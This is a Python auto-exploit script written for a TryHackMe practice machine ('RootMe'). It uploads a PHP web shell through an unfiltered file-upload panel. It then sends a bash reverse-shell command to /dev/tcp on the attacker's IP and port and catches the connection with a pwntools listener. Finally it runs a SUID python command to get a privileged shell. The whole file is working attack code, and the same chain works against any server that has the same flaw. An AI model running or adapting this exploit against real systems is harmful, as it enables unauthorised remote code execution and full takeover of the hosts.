#!/bin/python3

import sys
import requests
import argparse
import subprocess
import threading
from pwn import *

def get_arguments():

    parser = argparse.ArgumentParser(description='AutoPwn for RootMe - TryHackMe Machine by xD4nt3')
    parser.add_argument('-t','--target', dest='url', required=True, help='Enter the target IP)')
    parser.add_argument('-p','--port', dest='port', required=True, help='Enter the local port for the reverse shell')
    parser.add_argument('-i','--ip', dest='ip', required=True, help='Enter the local IP (tunnel) for the reverse shell)')

    return parser.parse_args()

def file_uploadRCE(url):

    url_post = "http://"+url+"/panel/"

    headers = {
        "Host": url,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://"+url+"/panel/",
        "Content-Type": "multipart/form-data; boundary=---------------------------24577499229104560911926188106",
        "Content-Length": "386",
        "Origin": "http://"+url,
        "DNT": "1",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }

    data = """-----------------------------24577499229104560911926188106
Content-Disposition: form-data; name="fileUpload"; filename="pwned.php5"
Content-Type: application/x-php

<?php echo passthru($_GET['cmd']); ?>

-----------------------------24577499229104560911926188106
Content-Disposition: form-data; name="submit"

Upload
-----------------------------24577499229104560911926188106--"""

    response = requests.post(url_post, headers=headers, data=data)

    if response.status_code == 200:
        print("\nMalicious PHP file was uploaded successfully\n")
    else:
        print("An error has ocurred")


def request_payload(url,port,ip):

    payload = f"?cmd=bash -c 'bash -i >%26 /dev/tcp/{ip}/{port} 0>%261'"
    url_get = "http://"+url+"/uploads/pwned.php5"+payload
    r = requests.get(url_get)


def getReverseShell(url,port,ip):
    print("\nCreating the reverse shell :D\n")
    try:
        payload_thread = threading.Thread(target=request_payload, args=(url,port,ip))
        payload_thread.start()
    except Exception as e:
        sys.exit(1)
    listener = listen(port,timeout=30)
    shell = listener.wait_for_connection()
    shell.sendline("/usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'")
    shell.interactive()

def main():

    args = get_arguments()
    file_uploadRCE(args.url)
    getReverseShell(args.url,args.port,args.ip)

if __name__ == '__main__':

    main()
